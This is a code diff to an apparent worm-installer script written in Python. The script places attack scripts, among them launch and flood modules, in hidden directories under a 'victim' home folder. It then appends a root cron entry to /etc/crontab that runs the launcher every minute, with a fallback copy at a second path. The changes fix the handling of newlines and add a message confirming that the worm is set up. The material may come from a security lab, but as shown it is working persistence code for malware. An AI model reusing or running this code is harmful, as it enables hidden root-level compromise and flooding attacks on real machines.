@@ -4,7 +4,7 @@ import sys
 
 attackDirs = ['/home/victim/.etc', '/home/victim/.var']
 attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
-attackCommand = '* * * * * root /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py || ( /usr/bin/python /home/victim/.var/.module/Launch_Attack.py ) \n'
+attackCommand = '* * * * * root /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py || ( /usr/bin/python /home/victim/.var/.module/Launch_Attack.py )'
 
 
 def set_up_crontab():
@@ -15,6 +15,7 @@ def set_up_crontab():
     crontab = open('/etc/crontab', 'a')
 
     crontab.write(attackCommand)
+    crontab.write('\n')
     crontab.close()
 
 
@@ -70,3 +71,5 @@ if __name__ == '__main__':
 
     set_up_attack()
     set_up_crontab()
+
+    print('Already set up worm in the \'victim\'.')
